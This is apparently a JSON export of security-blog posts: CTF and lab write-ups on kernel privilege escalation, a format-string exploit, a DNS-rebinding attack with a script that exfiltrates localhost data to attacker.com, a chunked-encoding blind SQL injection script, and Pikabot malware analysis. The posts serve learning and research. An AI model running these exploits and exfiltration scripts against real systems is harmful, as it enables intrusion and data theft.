[{"content":"Setup Link to the original vulnerability report can be found here.a\nSetting up environment To get up and running as quick as possible, setup your environment as follows:\n1 2 3 4 5 6 7 8 sudo apt update sudo apt install -y \\ python3 python3-pip python3-venv \\ bc binutils bison dwarves flex gcc git gnupg2 gzip libelf-dev libncurses5-dev libssl-dev make openssl dwarves perl-base rsync tar xz-utils \\ libguestfs-tools \\ tmux \\ gdb \\ qemu qemu-kvm bridge-utils Then download the most recent affected version:\nBuilding Make a default config with:\n1 make defconfig and then nf_tables support with:\n1 2 CONFIG_NETFILTER=y CONFIG_NF_TABLES=y I also have a working config here (will add soon once post is finished).\nThen build the kernel with:\n1 make -j$(nproc) Then we also need to setup directories for libguestfs to work properly.\n1 2 make modules make modules_install Then\n1 2 cp arch/x86/boot/bzImage /lib/modules/6.7.0-rc8/vmlinuz sudo chmod +r /lib/modules/6.7.0-rc8/vmlinuz Then run this script:\n1 2 3 4 5 6 virt-customize -a ubuntu-24.04-minimal-cloudimg-amd64.img \\ --root-password password:root \\ --ssh-inject pwn:file:/home/jp3g/.ssh/id_rsa.pub \\ --run-command \u0026#39;useradd -m -s /bin/bash pwn\u0026#39; \\ --password pwn:password:abc123 \\ --ssh-inject root:file:/home/jp3g/.ssh/id_rsa.pub This will create an unprivileged user as well as set passwords.\nGetting Exploit Download Google\u0026rsquo;s security-research repo into your host, and modify pocs/linux/kernelctf/CVE-2024-0193_cos/exploit/cos-105-17412.226.52/Makefile by adding -g to CFLAGS and removing the -s flag. Then copy it over to your qemu container with:\n1 2 virt-customize -a ubuntu-20.04-minimal-cloudimg-amd64.img \\ --copy-in /path/to/security-research/pocs/linux/kernelctf/CVE-2024-0193_cos/exploit/cos-105-17412.226.52/:/home/pwn/exploit GDB and QEMU Follow this guide to create a bridged network between qemu and your host.\nIn order to connect GDB to this container, run the following command and login as root:\n1 2 3 4 5 6 7 8 qemu-system-x86_64 -m 3.5G -nographic -no-reboot \\ -enable-kvm -cpu host -smp cores=2 \\ -kernel bzImage \\ -drive file=./ubuntu-24.04-minimal-cloudimg-amd64.img \\ -nic bridge,br=br0 -nographic \\ -append \u0026#34;root=/dev/sda1 rw console=ttyS0\u0026#34; \\ -s Once inside, run:\n1 2 ip link set enp0s3 up dhclient enp0s3 This should give you an IP address. Now we have to install gdb for debugging userspace code.\n1 2 3 4 5 apt install \\ binutils \\ gdb \\ build-essential \\ pkg-config Then build the exploit from whatever directory you copied it into:\n1 2 make prerequisites make exploit Then run gdb:\n1 2 gdb (gdb) remote target localhost:1234 Getting load address Next, we have load the symbols from vmlinux into gdb at the correct address. After you have gotten a shell in qemu as root, run:\n1 cat /proc/kallsyms | grep strncpy_from_user This will give you the address of the strncpy_from_user function. You can of course use any function, but this is the one I chose for my example. You will see the address at which the function is loaded. I know from my own testing and calculations that strncpy_from_user is 0x548170 bytes from the load address. So whatever address you got from kallsyms, just subtract this amount from it, and you will get your load address.\nThen you can load in the symbols file with:\n1 (gdb) add-symbols-file ./vmlinux \u0026lt;load address\u0026gt; Background So I will be using the following versions:\nlibnftnl : libnftnl-1.2.6 pipapo \u0026ldquo;Pipelined Adaptive Packet Process\u0026rdquo;, and a pipapo set refers to a specific data struct used for efficiently storing and looking up elements. It provides fast lookup and is built for handling large sets of elements.\nnftnl_table ntfnl_table_set_str 1 2 3 4 5 EXPORT_SYMBOL(nftnl_table_set_str); int nftnl_table_set_str(struct nftnl_table *t, uint16_t attr, const char *str) { return nftnl_table_set_data(t, attr, str, strlen(str) + 1); } Vulnerability In the exploit given, the creates sets set1 and set2, with catchall elements set1_elem and set2_elem respectively. They are then deleted by building and sending a NFT_MSG_DELSET type Netlink message, which deactivates the data of the set elements. Then the catchall element should be GC\u0026rsquo;d (garbage collected), which deactivates its data again, resulting ins a double free.\nThis is achieved by setting a short timeout on a set element. Timeouts determine how long that element needs to stay in the set before it gets automatically removed. Then create the delay. Then delete the vulnerable pipapo set. We can break it down in GDB to match the sections in the original disclosure.\nTriggering: Set breakpoints at nftnl_set_alloc.\nExploitation ","date":"2024-07-04T02:45:01-07:00","image":"https://i.pinimg.com/564x/05/2e/8d/052e8d59f511fd32a620ce1d12da0aa3.jpg","permalink":"https://Kvn11.github.io/p/intro-to-kernel-exploitation-cve-2024-0193_cos/","title":"Intro To Kernel Exploitation - CVE-2024-0193_cos"},{"content":"Setup WORK IN PROGRESS\u0026hellip;\nThis is the solution for HTB\u0026rsquo;s Kernel Adventures: Part II, and in the process, we can learn and get an introduction to kernel exploitation.\nAfter you download the challenge, just follow the instructions in the README to get the required version of the linux kernel installed so we can take a look in our code editor. However, you may get an error during the git apply command. To resolve these, you first need to run git checkout ff1ffd71d5f0612cf194f5705c671d6b64bf5f91 to revert the repo to the commit in which the vulnerability was introduced. Now we have the code for the vulnerable kernel, and the author provided the image meant for the challenge.\nGoals So I will take 2 approaches here. The first is to do a code review to find the vuln by hand (eyes). Then I want to build a fuzzer to automate the finding.\nFinding Vulnerability So my first approach here is to look at the patch.diff file to see what was changed. There was a folder magic/ that was added. Also, there is a new syscall magic added to arch/x86/entry/syscalls/syscall_64.tbl However, the \u0026ldquo;meat\u0026rdquo; of the challenge is in magic/magic.c, which fleshes out the syscall.\nLets walkthrough what the new syscall does. First it will initialize itself via the do_init() function, but only if the initialized value is not 0.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 void do_init() { char username[64] = \u0026#34;root\u0026#34;; char password[64] = \u0026#34;password\u0026#34;; struct MagicUser* root; spin_lock(\u0026amp;magic_lock); root = kzalloc(sizeof(struct MagicUser), GFP_KERNEL); root-\u0026gt;uid.val = 0; memcpy(root-\u0026gt;username, username, sizeof(username)); memcpy(root-\u0026gt;password, password, sizeof(password)); root-\u0026gt;children = kzalloc(sizeof(struct MagicUser*) * CHILDLIST_SIZE, GFP_KERNEL); magic_users[0] = root; nextId = 1; initialized = 1; spin_unlock(\u0026amp;magic_lock); } This function sets the default username and password to root:password. It also defines a MagicUser* called root. Then kzalloc is called and the resulting pointer is assigned to root. From my understanding, kzalloc will allocate a chunk and initialize its memory to zero. An important thing to note here is that this allocation will need to be freed at some point. Anyways, this function pretty much sets the first user to be root, then creates an allocation for the next user, who will be the child of this root user.\nNow lets look at the individual actions we can get this syscall to perform. Lets start with adding a user with long do_add(char* username, char* password). First it checks if the user that will be added exists. This is done by just iterating over the list of users, and checking the username against the supplied username. Then an empty entry in the user list is found, which is where the new user will be added. This works similar to the find function, where the user list is iterated over until a null entry is found, and that index is returned. Then a search for the current user is conducted, but this time by uuid. Again, this is just a simple for loop that compares uid, nothing special. Then it will locate an empty slot in the current users child list. Then another call to kzalloc for the new user. And the next user is given the nextId value, which will be +1 from the previous. We should note, that in no other function is there something to decrement the nextId value, meaning it will always increase. Maybe we could just create new users until we overflow the uid value to be 0 again? Seems possible, cuz nextId is an unsigned short (2 bytes), so thats a total of 0xFFFF values. Once we obtain that UUID, it would seem that some other values are changed, and then we obtain the privileges of the user with that UUID. So if we get UUID 0, then we get the privileges of the root user. Here is my exploit. After compiling, I gzipped it, then copied it over to the victim machine with base64 encoding.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define MAGIC_SYS 449 int main() { long uuid = 1; for (int i = 0; i \u0026lt; 0xFFFFFFFF; i++) { // Create the user uuid = syscall(MAGIC_SYS, 0, \u0026#34;bob\u0026#34;, \u0026#34;abc123\u0026#34;); if (uuid == 0) { syscall(MAGIC_SYS, 3, \u0026#34;bob\u0026#34;, \u0026#34;abc123\u0026#34;); char *shell = \u0026#34;/bin/sh\u0026#34;; char *args[] = {shell, NULL}; execve(shell, args, NULL); return 0; } // Delete the user syscall(MAGIC_SYS, 2, \u0026#34;bob\u0026#34;, \u0026#34;abc123\u0026#34;); } return 0; } 1 musl-gcc -static -march=x86-64 -Os expl.c -o expl ","date":"2024-04-08T02:45:01-07:00","image":"https://i.pinimg.com/originals/d8/73/c9/d873c94e242bafe6bbcfa83cde3b8b42.jpg","permalink":"https://Kvn11.github.io/p/kernel-adventures-part-ii/","title":"Kernel Adventures Part II"},{"content":"Locating Vulnerability The challenge consists of a web server that allows a user to upload an mp3 file, and then plays that file.\nNext, it is time to reverse engineer the application in binary ninja. The code is pretty straightforward, there is a check to see if the uploaded file is an mp3.\nIn the mp3 check, there seems to be some \u0026ldquo;beta\u0026rdquo; functionality, which is where the code to reveal the flag is.\nWe need to change two of the variables to different values in order to trigger the beta function. There are 2 freads that occur in this function. Both read from the mp3 file we upload. The first one is a read of 3 bytes, which is meant to obtain the magic bytes of the file. The magic bytes need to be the string ID3.\nThe second read is of size 0x16 bytes, and is interesting because the read bytes are later printed via a printf statement. This makes me think that we could do a write via a format string vulnerability. At this point, I don\u0026rsquo;t know if there is an overflow in any of the fread calls, but we know that there is a pointer to the two values we need to change, which we can catch with a format string exploit, and then we can write a specific value to those addresses using a format string payload. The next step is to verify these vulnerabilities with a debugger.\nVerifying vulnerability I built a PoC payload using the correct magic bytes, and used a cyclic pattern of 0x16 bytes incase there is an overflow.\nSince we have a specific libc to use, we have to use the following command to run the binary:\n1 LD_LIBRARY_PATH=/path/to/glibc LD_PRELOAD=/path/to/glibc/libc.so.6 ./main Additionally the file is being called as /tmp/test.mp3 so we need to change the name and location of our PoC.\nBehaviour is as expected, no obvious overflow since stack cookie fail was not triggered.\nChecking out a generic format string payload in GDB, I was also able to verify that there was no overflow.\nThe payload starts at 0x7fffffffdbd0, and isn\u0026rsquo;t enough to overwrite not even the stack cookie, which is at 0x7fffffffdbe8 So at this point I am confident that this is just a format string vuln. I am able to get the pointers to the values that need to change by referencing the 12th and 13th values on the stack: %12$p.%13$p\nExploit Since we now know where to write, we can craft our write. The first write will be for 48879, and the second for 495. The reason for this is that the after the first write (48879 = beef), then we need to subtract that write from the second (49374 = c0de). So the payload becomes: ID3%48879x%12$n%495x%13$n, which fits perfectly in our 22 byte restriction.\nAnd that works just fine:\n","date":"2024-03-30T02:45:01-07:00","image":"https://Kvn11.github.io/p/htb-pwn-pixel-audio/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/htb-pwn-pixel-audio/","title":"HTB PWN Pixel Audio"},{"content":"Intro This challenge allows you to submit a URL to be \u0026ldquo;scanned\u0026rdquo; by a bot on the challenge server. The flag is shown in the webapp once you have successfully accessed the appropriate page with the credentials of the \u0026ldquo;Overseer\u0026rdquo; user.\nFoothold One of the first things I noticed in the source code, was the /debug and /register endpoint. The /debug endpoint caught my attention because it could reveal the secret REFERRAL_TOKEN value which is required to register via /register as the higher privilege researcher type of user.\n1 2 3 4 5 6 7 8 9 10 // challenge/index.js app.get(\u0026#34;/debug\u0026#34;, util.isLocalhost, (req, res) =\u0026gt; { let utils = require(\u0026#34;util\u0026#34;); res.end( Object.getOwnPropertyNames(global) .map(n =\u0026gt; `${n}:\\n${utils.inspect(global[n])}`) .join(\u0026#34;\\n\\n\u0026#34;) ); }); When accessed via a GET request from localhost, it responds with a detailed inspection of all properties of the global object in Node.js. It\u0026rsquo;s a way to inspect the global environment for debugging purposes. In all honesty, at this point I couldn\u0026rsquo;t see how I could leverage this to get the flag, but it seemed like a good step up since I was obtaining higher permissions. This is probably something I need to work on for the future. This is clearly SSRF, but we can\u0026rsquo;t see the output of the response, so we also need to combine it with a way to exfiltrate the response. So then my next thought was to submit a URL I control. The URL will contain a webpage that contains a script that will make a request to the /debug endpoint, and then submit the response from that request back to my own web server.\nI hosted a web page on an EC2 instance, and had the following script run on it:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 function fetchData() { return fetch(\u0026#39;http://localhost/debug\u0026#39;) .then(response =\u0026gt; { if (!response.ok) { throw new Error(\u0026#39;Network response was not ok\u0026#39;); } return response.text(); // Return the response as text }) .catch(error =\u0026gt; { console.error(\u0026#39;Error fetching data:\u0026#39;, error); }); } // Function to send a POST request to `http://attacker.com/` with the fetched data after a delay of 3 seconds function sendDataWithDelay(data) { setTimeout(() =\u0026gt; { fetch(\u0026#39;http://attacker.com/\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }, body: data }) .then(response =\u0026gt; { if (!response.ok) { throw new Error(\u0026#39;Network response was not ok\u0026#39;); } console.log(\u0026#39;Data sent successfully\u0026#39;); }) .catch(error =\u0026gt; { console.error(\u0026#39;Error sending data:\u0026#39;, error); }); }, 3000); // Delay of 3 seconds (3000 milliseconds) } // Usage: Fetch data and then send it after a delay of 3 seconds fetchData() .then(data =\u0026gt; { if (data) { sendDataWithDelay(data); } }); This somewhat worked, but I wasn\u0026rsquo;t able to receive the request to exfil.\nThis request could have gotten blocked due to the CORS policy, and upon some research it seemed that http.server does not allow controlling the CORS header from the commandline. However, it is possible with a little scripting and help from stackoverflow\nThen we can verify it worked with burpsuite. I blurred out the IP address of my EC2 instance since I don\u0026rsquo;t want it getting touched :).\nHowever, the POST request never went out. This was again due to the CORS policy on my local http.server not havint the correct value, which then made me look into what the CORS and CSP policy was on the actual challenge.\n1 2 3 4 5 6 7 8 9 10 11 12 13 app.use((req, res, next) =\u0026gt; { // no XSS or iframing :\u0026gt; res.setHeader(\u0026#34;Content-Security-Policy\u0026#34;, ` default-src \u0026#39;self\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com; font-src https://fonts.gstatic.com; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;; frame-ancestors \u0026#39;none\u0026#39;; `.trim().replace(/\\s+/g, \u0026#34; \u0026#34;)); res.setHeader(\u0026#34;X-Frame-Options\u0026#34;, \u0026#34;DENY\u0026#34;); next(); }); I couldn\u0026rsquo;t find anything to indicate what the CORS policy was so I assumed it was set as the default Same Origin Policy. My testing also implied this, so now is the time to think of how to bypass it.\nCORS CORS is a policy defined by the web server that determines what requests it will accept. If you intercept a response from a web server with a CORS policy you will see the header:\n1 Access-Control-Allow-Origin: * This header can have multiple values to specify multiple domains, or a wildcard as shown above, or a null value. It makes sense too because a site that holds private information probably doesn\u0026rsquo;t want to share information to applications outside of its domain. Anyways, there are 2 parts to CORS. There is a preflight request that happens from the client to the web server to ensure that the cross-site request is allowed, and then the actual request. However these only happen when non-standard requests are made I think, or when you need to read the headers or data of the response (TODO: Verify this)\nSOP Same Origin Policy is similar to CORS, but it is enforced by the browser. This policy just makes it so that a client can only request resources from the same origin, that is the same: protocal, domain, and port. For example: a request from https://foo.com to http://foo.com wouldn\u0026rsquo;t work because there is a different protocol between the two addresses.\nBypass 1 So the problem here is that our site, lets call it http://attacker.com is trying to make a request to http://localhost/debug, but because the domain, and the port are different then the request is not allowed by the bot\u0026rsquo;s browser.\nAnd our goal is for the bot to visit our page, our page sends a request to the local server address of the challenge site, and then our page posts that request to us at another endpoint.\nEnter DNS Rebind. While searching for bypasses on hacktricks, I came across this method. The attack relies on changing the IP address for a domain (rebinding it), very quickly, sort of like a race condition. How does that help us here? Well in the source code for the bot, we can see that it doensn\u0026rsquo;t perform all its actions immediately, there are delays.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 // challenge/bot.js const visit = async (url) =\u0026gt; { let browser; try { browser = await puppeteer.launch({ headless: true, pipe: true, args: [ \u0026#34;--no-sandbox\u0026#34;, \u0026#34;--disable-setuid-sandbox\u0026#34;, \u0026#34;--js-flags=--noexpose_wasm,--jitless\u0026#34;, ], dumpio: true }); let context = await browser.createIncognitoBrowserContext(); let page = await context.newPage(); await page.goto(\u0026#34;http://localhost/login\u0026#34;, { waitUntil: \u0026#34;networkidle2\u0026#34; }); await page.evaluate((user, pass) =\u0026gt; { document.querySelector(\u0026#34;input[name=user]\u0026#34;).value = user; document.querySelector(\u0026#34;input[name=pass]\u0026#34;).value = pass; document.querySelector(\u0026#34;button[type=submit]\u0026#34;).click(); }, \u0026#34;The Overseer\u0026#34;, password); await page.waitForNavigation(); await page.goto(url, { waitUntil: \u0026#34;networkidle2\u0026#34; }); await page.waitForTimeout(7000); await browser.close(); browser = null; } catch (err) { console.log(err); } finally { if (browser) await browser.close(); } }; So the problem is that the client is making a request to http://localhost/debug from http://attacker.com, which gets blocked. But what if during the delay between the bot visiting the attacker site, and then timing out, we rebind the address for http://attacker.com to instead point to 127.0.0.1?\nSo the bot visits http://attacker.com, which will resolve to our real address (lets say it is 1.3.3.7). We rebind http://attacker.com to 127.0.0.1, WHILE the bot still has the page loaded in their browser. Then our script will run, and will send a request to http://attacker.com/debug, which is now actually http://127.0.0.1/debug, successfully grabbing the environment data that we need. Then we make a post request to http://1.3.3.7/exfil containing the response to http://attacker.com/debug (actually http://127.0.0.1/debug), (and we set our CORS policy to allow requests from any domain), which successfully exfils the data to us. A key element to making this attack work is having a low TTL on the DNS response, so the browser is forced to ask for the address twice.\nI decided to use this dns rebind site to facilitate the attack. The first address will be that of my EC2 instance, and the second will be 127.0.0.1. Then we just need to run the attack a few times until we get the elements to line up properly.\nHowever this attack kept failing. I would always receive both requests to my ec2 instance, no matter how many times I tried. I tried changing the delays, but never worked. At the end of this article I will explore why this was.\nBypass 2 In the same hacktricks article, a second subtype of dns rebinding was mentioned. Its very similar, but instead of depending on TTL to cause the browser to resolve the address, it will used availability of the server instead. We can use a service like AWS Route 53 to register 2 IP addresses for the same domain name, in our case it will be (1.3.3.7 and 127.0.0.1). For the first request to collect the CSRF payload, we allow the 1.3.3.7 ec2 instance to remain available, but once the page is loaded, we kill the instance. That way, when the next request is made to http://attacker.com/debug and it tries to make the request to our ec2 instance at 1.3.3.7, the request will fail, and the victim\u0026rsquo;s browser will fallback to 127.0.0.1, allowing the attack to work. I will also set up a second ec2 instance to collect the post request, because I don\u0026rsquo;t want to depend on the first ec2 instance booting up in time to catch the exfiltration POST request. In AWS this is called failover-routing. However, this requires registering a domain with AWS, which costs about 13$ depending on the name you chose, or 79$ to transfer in an existing domain. I tried to find a free alternative, but wasn\u0026rsquo;t successful. Seems like at the minimum you need a domain, which I was able to get on Gandi for about 3$. Then I added in 2 DNS A records with the address of my ec2 instance and 0.0.0.0 as per the suggestion on HackTricks.\nThe min TTL is 300, but fortunately we won\u0026rsquo;t depend on TTL for this attack, since we just depend on connectivity causing the browser to fallback to the alternative address (0.0.0.0).\nAND THIS WORKED !!\nAt this point just little automation for killing the payload server after the first request, and saving the post request for further examination:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/usr/bin/python3 from http.server import HTTPServer, SimpleHTTPRequestHandler, test import sys class CORSRequestHandler(SimpleHTTPRequestHandler): def end_headers(self): self.send_header(\u0026#39;Access-Control-Allow-Origin\u0026#39;, \u0026#39;*\u0026#39;) SimpleHTTPRequestHandler.end_headers(self) def do_GET(self): if self.path == \u0026#39;/index.html\u0026#39;: SimpleHTTPRequestHandler.do_GET(self) sys.exit(0) # Exit the program after serving the index.html file else: SimpleHTTPRequestHandler.do_GET(self) def do_POST(self): content_length = int(self.headers[\u0026#39;Content-Length\u0026#39;]) post_data = self.rfile.read(content_length) if self.path == \u0026#39;/exfil\u0026#39;: with open(\u0026#39;debug.txt\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(post_data) print(\u0026#34;[*] Exfil data written to debug.txt\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: test(CORSRequestHandler, HTTPServer, port=80) ","date":"2024-02-20T02:45:01-07:00","image":"https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/htb-insane-web-oopartdb/","title":"HTB Insane Web OOPArtDB"},{"content":"Intro Given that I\u0026rsquo;m currently grinding leetcode and app sec stuff, this challenge was super enjoyable. The vulnerability is very straightforward and easy to spot, and you get to write a binary search script to leak the flag (you don\u0026rsquo;t have to, but it does offer optimal time complexity).\nWalkthrough There is an SQL injection available within the unsafequery() function.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function unsafequery($pdo, $id) { try { $stmt = $pdo-\u0026gt;query(\u0026#34;SELECT id, gamename, gamedesc, image FROM posts WHERE id = \u0026#39;$id\u0026#39;\u0026#34;); $result = $stmt-\u0026gt;fetch(PDO::FETCH_ASSOC); return $result; } catch(Exception $e) { http_response_code(500); echo \u0026#34;Internal Server Error\u0026#34;; exit(); } } This unsafe function can only be called when we have the Transfer-Encoding: chunked header in our request, but if the query succeeds then we will only see an error message.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 if (isset($_SERVER[\u0026#34;HTTP_TRANSFER_ENCODING\u0026#34;]) \u0026amp;\u0026amp; $_SERVER[\u0026#34;HTTP_TRANSFER_ENCODING\u0026#34;] == \u0026#34;chunked\u0026#34;) { $search = $_POST[\u0026#39;search\u0026#39;]; $result = unsafequery($pdo, $search); if ($result) { echo \u0026#34;\u0026lt;div class=\u0026#39;results\u0026#39;\u0026gt;No post id found.\u0026lt;/div\u0026gt;\u0026#34;; } else { http_response_code(500); echo \u0026#34;Internal Server Error\u0026#34;; exit(); } } However, this is enough for blind SQL. We can iterate over the indices of the flag value, and compare each substring of length 1 at that index with another character, and make educated guesses about the value of the flag. Take a look at the following:\n1 2 3 SELECT id, gamename, gamedesc, image from posts where id = \u0026#39;1\u0026#39; AND 1=1 ;-- SELECT id, gamename, gamedesc, image from posts where id = \u0026#39;1\u0026#39; AND substr(\u0026#39;HTB\u0026#39;, 1, 1) = \u0026#39;H\u0026#39; ;-- SELECT id, gamename, gamedesc, image FROM posts WHERE id = \u0026#39;1\u0026#39; AND substr((SELECT gamedesc FROM posts WHERE id = \u0026#39;6\u0026#39;), 1, 1) \u0026gt; \u0026#39;A\u0026#39; ;-- All of these statements will execute successfully, giving us the No post id found message.\nIt\u0026rsquo;s just a slightly more convuluted basic SQL injection, but you base your guess of the flag value based on whether the second condition resolves to True or False. This is where leetcode comes in. So the flag can contain any value from 0x20 to 0x7f (that is just the readable ASCII range). So we can use a binary search algorithm to make a guess as to whether a character in the flag is greater or lesser than some mid range value. We just take the mid point of 0x20 and 0x75, create a query that will give us the No post id found message if the flag letter is greater, or give us a 500 error if its not. Then we readjust the range, and keep repeating until only 1 character is left.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 #!/usr/bin/python3 import requests URL = \u0026#34;http://localhost:1337\u0026#34; PATH = \u0026#34;/Controllers/Handlers/SearchHandler.php\u0026#34; def build_query(idx, c): query = f\u0026#34;search=6\u0026#39; AND substr((SELECT gamedesc FROM posts where id = \u0026#39;6\u0026#39;), {idx}, 1) \u0026gt; \u0026#39;{c}\u0026#39; ;--\u0026#34; payload = \u0026#34;\u0026#34; payload += f\u0026#34;{len(query):X}\\r\\n\u0026#34; payload += query payload += \u0026#34;\\r\\n\u0026#34; payload += \u0026#34;0\\r\\n\u0026#34; payload += \u0026#34;\\r\\n\u0026#34; return payload def make_request(payload): headers = { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Transfer-Encoding\u0026#34;: \u0026#34;chunked\u0026#34; } r = requests.post(URL + PATH, data=payload, headers=headers) if r.status_code == 200: return True else: return False def find_letter(idx): start = 32 end = 127 while (end - start) \u0026gt; 0: mid = (start + end) // 2 q = build_query(idx, chr(mid)) correct = make_request(q) if correct: start = mid + 1 else: end = mid return chr(start) print(\u0026#34;[i] LEAKING FLAG: \u0026#34;, end=\u0026#34;\u0026#34;) letter = \u0026#34;\u0026#34; ctr = 1 while letter != \u0026#34;}\u0026#34;: letter = find_letter(ctr) print(letter, end=\u0026#34;\u0026#34;) ctr += 1 ","date":"2024-02-08T02:45:01-07:00","image":"https://Kvn11.github.io/p/when-leetcode-meets-hacking/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/when-leetcode-meets-hacking/","title":"When Leetcode Meets Hacking"},{"content":"Sample Info 7e26c4f6f313e5248898a1dbe706ae5b998e12ff16947cb3bfda690ca62612c4\nInitial Analysis Based on low number of imports, plus a large and high entropy .rsrc section, this sample is likely packed.\nAmong the imports are IsDebuggerPresent and GetTickCount which could be signs of anti-vm techniques that are present in this sample as well. There were also a large number of exports, all named after some drawing related functionality.\nLoader In the DLLMain that binja finds, there is a call to DisableThreadLibraryCalls which is a tactic that increases the invisibility of the DLL. It will disable the DLL_THREAD_ATTACH and DLL_THREAD_DETACH notifications.\nHowever, there isn\u0026rsquo;t much more to see within this main function. Due to the massive amount of exports, and not having access to the delivery method part of the sample, figuring out the function responsible for unpacking is going to be difficult. However, Pikabot is known to use a lot of anti analysis, so a good place to start would be to look for usage of IsDebuggerPresent, since the locations in where it appears are likely part of the unpacking process. And fortunately, it only appears once, making this idea a success. This gives me a starting point from where I can start unraveling this sample.\nUnfortunately, following up the call history still results in a lot of options for arriving to this check, so I decide to use process of elimination to start getting rid of some of the exported functions.\n** WORK IN PROGRESS **\nPayload I jumped ahead with unpac.me to unpack the sample and start looking at the main payload. Right away, we can see that there is some multiplication of values (maybe a potential key), and data is being copied into some buffers. There are also references to chrome extensions in some of the strings in this _start function.\nThere does seem to be some level of obfuscation when determining the indices of the arrays by using while loops with 2 conditions, one of them being impossible.\n","date":"2023-12-12T02:45:01-07:00","image":"https://Kvn11.github.io/p/pikabot-malware-analysis/img/cover_hu7e43340f20ef237573ca21eeae8912fa_89734_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/pikabot-malware-analysis/","title":"Pikabot malware analysis"},{"content":"Sample Info 0581f0bf260a11a5662d58b99a82ec756c9365613833bce8f102ec1235a7d4f7\nInitial Analysis Based on the few number of imports, and the size of the .data section, this sample is likely packed.\nUnpacking Unpacking proved to be more difficult than expected. None of my breakpoints every got reached because my debugger exited before ever reaching the sample\u0026rsquo;s entry point. Additionally, after x64dbg\u0026rsquo;s call to LoadLibraryW to load the sample, I could see that the sample had some memory reserved, but none of it\u0026rsquo;s sections were mapped. I figured it was probably receiving the wrong reason from the calling process and this was an anti analysis feature. But then after looking at PE-Bear a lil more I realized that this DLL has a number of exports, so I could just use rundll.exe to call the functions manually and pass this obstacle.\nAfter the dll is loaded in x64dbg, I just set breakpoints on each of the exported functions.\nWhen continuing, the first breakpoints I hit is the first function I called, DllRegisterServer. This function was filled with instructions like cmp al, al; jne which were interesting because I don\u0026rsquo;t think the jump would ever trigger. My thought is that this was supposed to be an anti analysis technique. Also, I quickly realized that debugging without knowing what I was looking for would be confusing and not very fruitful so I went back to binja to do some static analysis. However, due to the fake branching, the code is a bit convuluted and hard to follow. I decided to make a script to get rid of them.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 def is_fake_cmp(instr): if instr.tokens[0].text == \u0026#34;cmp\u0026#34;: op1 = instr.tokens[2] op2 = instr.tokens[4] if op1.text == op2.text: return True def is_jump(instr): if instr.tokens[0].text in [\u0026#34;je\u0026#34;, \u0026#34;jne\u0026#34;, \u0026#34;jz\u0026#34;, \u0026#34;jnz\u0026#34;]: return True else: return False def find_fake_jmps(basic_block): fake_jmps = [] instructions = basic_block.get_disassembly_text() ctr = 0 while ctr \u0026lt; len(instructions): instr = instructions[ctr] if is_fake_cmp(instr): #print(f\u0026#34;[i] Fake cmp @ 0x{instr.address:016X}\u0026#34;) next_instr = instructions[ctr + 1] if is_jump(next_instr): print(f\u0026#34;[*] FOUND FAKE jump @ 0x{next_instr.address:016X}\u0026#34;) fake_jmps.append( (instr, next_instr) ) ctr += 1 ctr += 1 return fake_jmps def patch_fake_jmp(instr_pair): cmp_instr = instr_pair[0] jmp_instr = instr_pair[1] jmp_type = jmp_instr.tokens[0].text if jmp_type == \u0026#34;je\u0026#34;: bv.always_branch(jmp_instr.address) elif jmp_type == \u0026#34;jne\u0026#34;: bv.never_branch(jmp_instr.address) elif jmp_type == \u0026#34;jz\u0026#34;: bv.always_branch(jmp_instr.address) elif jmp_type == \u0026#34;jnz\u0026#34;: bv.never_branch(jmp_instr) else: print(f\u0026#34;[!] Unhandled jmp @ 0x{jmp_instr.address:016X}\u0026#34;) return False bv.convert_to_nop(cmp_instr.address) return True def remove_fake_branches(fn_addr): n_patched = 0 f = bv.get_function_at(fn_addr) for basic_block in f.basic_blocks: fake_jmps = find_fake_jmps(basic_block) for fj in fake_jmps: if patch_fake_jmp(fj): n_patched +=1 bv.begin_undo_actions() remove_fake_branches(0x7ffd00e31000) bv.commit_undo_actions() Also, from reading this article you will need to disable Tail Call Analysis in whatever tool you are using, otherwise, the psuedo c view will not be as concise as it could be. And just like that, the control flow becomes so much easier to read. Ngl, seeing this happen in real time was very satisfying.\nIf we follow the function calls in this now super flattened function, we end up at what looks to be a function that does some api hashing, and uses stack strings. I set breakpoints at these calls so I could figure out what api it was grabbing.\nI also found a check where the malware will only run its attack if the year is 2022. I ended up patching this instruction to always jump in x64dbg. EnumWindows accepts a callback function, which is a prime candidate for inserting a malicous function, so I decided to explore that next.\nCallback function Again, this function has a lot of fake branches, so prune those first. The 